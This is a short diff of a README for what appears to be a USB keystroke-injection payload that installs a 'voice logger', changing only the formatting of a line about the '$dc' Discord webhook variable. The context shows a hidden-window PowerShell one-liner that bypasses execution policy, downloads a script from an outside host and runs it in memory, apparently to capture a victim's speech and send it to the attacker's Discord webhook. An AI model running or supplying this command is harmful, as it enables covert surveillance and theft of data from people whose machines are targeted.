@@ -31,7 +31,7 @@ with the optional functionality of incorporating voice activated payloads.
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 
-`$dc` is the variable that stores your Discord webhook 
+<code>$dc</code> is the variable that stores your Discord webhook 
 
 ```
 powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
